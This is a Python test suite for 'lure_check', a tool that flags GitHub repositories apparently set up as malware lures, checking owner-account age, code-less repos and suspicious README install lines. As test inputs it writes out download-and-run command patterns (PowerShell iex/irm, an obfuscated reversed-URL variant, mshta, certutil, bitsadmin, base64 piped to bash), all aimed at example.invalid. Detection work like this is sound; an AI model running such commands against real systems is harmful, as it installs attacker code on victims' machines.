#!/usr/bin/env python3
"""Tests for lure_check. Run: python3 tests/test_lure_check.py (offline)"""

import io
import json
import os
import socket
import subprocess
import sys
import tempfile
from contextlib import redirect_stdout
from pathlib import Path


def _blocked(*args, **kwargs):
    raise RuntimeError("network disabled in tests")


socket.socket.connect = _blocked  # any accidental real connection fails loudly
socket.create_connection = _blocked

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))
import lure_check as lc  # noqa: E402

FIX = ROOT / "tests" / "fixtures"
FAILED = []


def check(name: str, ok: bool, detail: str = "") -> None:
    if not ok:
        FAILED.append(f"{name}: {detail}" if detail else name)


CASES = {c["full_name"]: c for c in json.loads((FIX / "lure_cases.json").read_text(encoding="utf-8"))}
XV = CASES["Toothbentweezers/xvsilhuu"]


def readme_of(case: dict) -> str:
    # lure_readme_defanged.md is a defanged copy of a real lure README (fake Microsoft
    # Activation Scripts, seen 26.09.2026): same structure, every URL replaced.
    # The other cases need only meta/owner/top_level, their README is "".
    return (FIX / case["readme_file"]).read_text(encoding="utf-8") if "readme_file" in case else ""


def run_case(case, top_level_calls=None, owner_calls=None):
    """lure_reason on a fixture case with counting fakes."""
    owner_calls = [] if owner_calls is None else owner_calls
    top_level_calls = [] if top_level_calls is None else top_level_calls

    def owner_fn(login):
        owner_calls.append(login)
        return case["owner_created_at"]

    def top_fn():
        top_level_calls.append(1)
        return case["top_level"]

    return lc.lure_reason(case["meta"], readme_of(case), owner_fn, top_fn)


# --- real cases -------------------------------------------------------------
check("xvsilhuu README flags", lc.readme_reason(readme_of(XV)) == "reversed-string URL in the install command")
m = XV["meta"]
check("xvsilhuu owner rule flags independently",
      lc.owner_reason(m["repo_created_at"], XV["owner_created_at"], m["repo_size_kb"], XV["top_level"])
      == "owner account created 1 min before the repo, and the repo has no code")
check("xvsilhuu lure_reason flags", run_case(XV) is not None)

age_on_send = lc._parse_dt(XV["digest_sent_on"] + "T00:00:00Z") - lc._parse_dt(XV["owner_created_at"])
check("age-now rule would miss it (owner >= 30 days old when listed)", age_on_send.days >= 30, str(age_on_send))
check("...but the creation-gap rule still flags it",
      lc.owner_reason(m["repo_created_at"], XV["owner_created_at"], m["repo_size_kb"], None) is not None)

owners, tops = [], []
check("README rule short-circuits", run_case(XV, tops, owners) is not None and (owners, tops) == ([], []))

tops = []
check("autoharness clean", run_case(CASES["tigerless-labs/autoharness"], tops) is None)
check("autoharness: contents checked once", len(tops) == 1, str(tops))

tops, owners = [], []
check("AIHOT clean", run_case(CASES["KKKKhazix/AIHOT"], tops, owners) is None)
check("AIHOT: no contents request", tops == [], str(tops))
check("AIHOT: one owner request", len(owners) == 1, str(owners))

# --- README rule ------------------------------------------------------------
for item in json.loads((FIX / "legit_install_lines.json").read_text(encoding="utf-8")):
    check(f"legit install line not flagged: {item['repo']}", lc.readme_reason(item["line"]) is None)

for line in (
    "iex (irm https://example.invalid/install.ps1)",
    "irm https://example.invalid/install.ps1 | iex",
    'powershell -ExecutionPolicy ByPass -c "irm https://example.invalid/install.ps1 | iex"',
):
    check(f"plain installer not flagged: {line[:40]}", lc.readme_reason(line) is None)

base = 'i`e`x(i`r`m(-join"x/dilavni.elpmaxe//:sptth"[-1..-99]))'
check("normalisation: backtick escapes", lc.readme_reason(base) is not None)
check("normalisation: zero-width char", lc.readme_reason(base.replace("i`e`x", "i\u200be`x")) is not None)
check("iex(irm( with a computed URL",
      lc.readme_reason("iex(irm(Get-Url))") == "iex(irm(...)) with a computed URL")

for line in (
    'powershell -w hidden -c "calc"',
    "mshta https://example.invalid/x.hta",
    "certutil -urlcache -f http://example.invalid/a.exe a.exe",
    "bitsadmin /transfer j http://example.invalid/a.exe C:\\a.exe",
):
    check(f"hidden launch: {line[:30]}", lc.readme_reason(line) == "hidden launch via a Windows system tool")

for line in (
    "echo ZWNobyBoaQ== | base64 -d | bash",
    "iex([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyBoaQ==')))",
    "powershell -enc " + "A" * 48,
    'exec(base64.b64decode("ZWNobyBoaQ=="))',
):
    check(f"base64 blob: {line[:30]}", lc.readme_reason(line) == "base64 blob decoded and executed")

# --- owner rule -------------------------------------------------------------
REPO, OWNER = "2026-08-23T01:33:30Z", "2026-08-23T01:31:56Z"
check("unknown contents is not codeless",
      lc.owner_reason(REPO, OWNER, 500, None) is None and lc.owner_reason(REPO, OWNER, 500, []) is None)
check("old account never flagged", lc.owner_reason(REPO, "2026-06-01T00:00:00Z", 1, [["file", "README.md"]]) is None)
check("negative gap counts as young",
      lc.owner_reason("2026-01-01T00:00:00Z", "2026-02-01T00:00:00Z", 1, None)
      == "owner account created 0 min before the repo, and the repo has no code")
check("gap unit: hours", "created 5 h before" in (lc.owner_reason("2026-08-23T06:00:00Z", "2026-08-23T00:30:00Z", 1, None) or ""))
check("gap unit: days", "created 20 days before" in (lc.owner_reason("2026-09-12T00:00:00Z", "2026-08-23T00:00:00Z", 1, None) or ""))
top = [["file", "README.md"], ["file", "LICENSE"], ["file", ".gitignore"]]
check("README+LICENSE only is codeless", lc.owner_reason(REPO, OWNER, 500, top) is not None)
check("a src dir is code", lc.owner_reason(REPO, OWNER, 500, top + [["dir", "src"]]) is None)


# --- HTTP layer: headers, token, failure semantics --------------------------
saved_token = os.environ.pop("GITHUB_TOKEN", None)
check("no token: no Authorization header", "Authorization" not in lc._headers())
check("User-Agent is lure-check", lc._headers()["User-Agent"] == "lure-check")
os.environ["GITHUB_TOKEN"] = "ghp_testtoken"
check("token sent as Bearer", lc._headers("x/y")["Authorization"] == "Bearer ghp_testtoken")
check("Accept passed through", lc._headers("x/y")["Accept"] == "x/y")
del os.environ["GITHUB_TOKEN"]


class FakeApi:
    """Replaces lc._http_get: routes api.github.com paths to canned responses."""

    def __init__(self, routes, default=(404, {}, "")):
        self.routes, self.default, self.calls = routes, default, []

    def __call__(self, url, accept=None):
        path = url.replace(lc.API, "")
        self.calls.append(path)
        resp = self.routes.get(path, self.default)
        if isinstance(resp, Exception):
            raise resp
        return resp


def run_cli(argv, fake=None):
    saved = lc._http_get
    if fake is not None:
        lc._http_get = fake
    buf = io.StringIO()
    try:
        with redirect_stdout(buf):
            rc = lc.main(argv)
    finally:
        lc._http_get = saved
    return rc, buf.getvalue()


OLD_META = json.dumps({"size": 900, "created_at": "2025-01-01T00:00:00Z", "owner": {"login": "someone"}})
OLD_USER = json.dumps({"created_at": "2020-01-01T00:00:00Z"})
CLEAN = {"/repos/o/clean": (200, {}, OLD_META), "/repos/o/clean/readme": (200, {}, "# hello\n\nnpm install foo\n"),
         "/users/someone": (200, {}, OLD_USER)}

rc, out = run_cli(["o/clean"], FakeApi(CLEAN))
check("live clean: exit 0", rc == 0, str(rc))
check("live clean: ok line", out.strip() == "ok    o/clean", repr(out))

rc, out = run_cli(["o/missing"], FakeApi({}))
check("live 404: exit 2", rc == 2, str(rc))
check("live 404: ?? line", out.strip() == "??    o/missing  could not check: repo not found (deleted or private)", repr(out))

limited = (403, {"x-ratelimit-remaining": "0", "x-ratelimit-reset": "1790000000"}, "")
rc, out = run_cli(["o/clean"], FakeApi({}, default=limited))
check("live rate limit on first call: exit 2", rc == 2, str(rc))
check("live rate limit: ?? line", out.startswith("??    o/clean  could not check: GitHub rate limit hit"), repr(out))

late = dict(CLEAN)
late["/users/someone"] = limited
late["/repos/o/clean"] = (200, {}, json.dumps({"size": 900, "created_at": "2025-01-01T00:00:00Z", "owner": {"login": "someone"}}))
rc, out = run_cli(["o/clean"], FakeApi(late))
check("rate limit mid-check is not 'clean'", rc == 2 and out.startswith("??"), f"{rc} {out!r}")

rc, out = run_cli(["o/clean"], FakeApi({"/repos/o/clean": (403, {"x-ratelimit-remaining": "5"}, "")}))
check("plain 403: ?? with HTTP 403", rc == 2 and "HTTP 403" in out, f"{rc} {out!r}")

rc, out = run_cli(["o/clean"], FakeApi({"/repos/o/clean": OSError("boom")}))
check("network error: ??", rc == 2 and "network error: boom" in out, f"{rc} {out!r}")

nr = dict(CLEAN)
nr["/repos/o/clean/readme"] = (404, {}, "")
rc, out = run_cli(["o/clean"], FakeApi(nr))
check("no README: ok + partial", rc == 0 and out.strip() == "ok    o/clean  (partial: no README)", f"{rc} {out!r}")

rc, out = run_cli(["not a repo"], FakeApi({}))
check("bad name: ??, no request", rc == 2 and "not an owner/repo name" in out, f"{rc} {out!r}")

# lure over the API: young owner + README-only repo
young_meta = json.dumps({"size": 2, "created_at": XV["meta"]["repo_created_at"], "owner": {"login": "Toothbentweezers"}})
lure_routes = {"/repos/t/x": (200, {}, young_meta), "/repos/t/x/readme": (200, {}, "# nothing here"),
               "/users/Toothbentweezers": (200, {}, json.dumps({"created_at": XV["owner_created_at"]}))}
fake = FakeApi(lure_routes)
rc, out = run_cli(["t/x", "o/clean"], fake)
check("live lure: exit 1 beats everything",
      rc == 1 and out.splitlines()[0] == "LURE  t/x  owner account created 1 min before the repo, and the repo has no code",
      f"{rc} {out!r}")
check("tiny repo: contents never requested", "/repos/t/x/contents/" not in fake.calls, str(fake.calls))

rc, out = run_cli(["--json", "t/x", "nope/nope"], FakeApi(lure_routes))
rows = [json.loads(line) for line in out.splitlines()]
check("--json: one object per repo with the 4 keys",
      len(rows) == 2 and all(set(r) == {"repo", "verdict", "reason", "partial"} for r in rows), out)
check("--json: verdicts", [r["verdict"] for r in rows] == ["lure", "unknown"], out)

# token never printed
os.environ["GITHUB_TOKEN"] = "ghp_secretvalue123"
rc, out = run_cli(["o/clean", "o/missing"], FakeApi(CLEAN))
del os.environ["GITHUB_TOKEN"]
check("token never printed", "ghp_secretvalue123" not in out)
if saved_token is not None:
    os.environ["GITHUB_TOKEN"] = saved_token

# --- CLI --readme (real process, offline) -----------------------------------
def cli(args):
    p = subprocess.run([sys.executable, str(ROOT / "lure_check.py")] + args, capture_output=True, text=True)
    return p.returncode, p.stdout.strip(), p.stderr.strip()


rc, out, _ = cli(["--readme", str(FIX / "lure_readme_defanged.md")])
check("--readme on defanged lure: exit 1", rc == 1, str(rc))
check("--readme on defanged lure: LURE line",
      out.startswith("LURE  ") and out.endswith("reversed-string URL in the install command"), out)

with tempfile.TemporaryDirectory() as tmp:
    clean = Path(tmp) / "README.md"
    clean.write_text("# Tool\n\nRun `pip install tool`.\n", encoding="utf-8")
    rc, out, _ = cli(["--readme", str(clean)])
    check("--readme on clean file: exit 0", rc == 0 and out.startswith("ok    "), f"{rc} {out!r}")
    rc, out, _ = cli(["--readme", str(Path(tmp) / "missing.md")])
    check("--readme on missing file: ?? exit 2", rc == 2 and out.startswith("??    "), f"{rc} {out!r}")

rc, _, _ = cli([])
check("no arguments: usage error, exit 2", rc == 2, str(rc))

if FAILED:
    print(f"FAILED {len(FAILED)}")
    for line in FAILED:
        print("  -", line)
    raise SystemExit(1)
print("all tests passed")
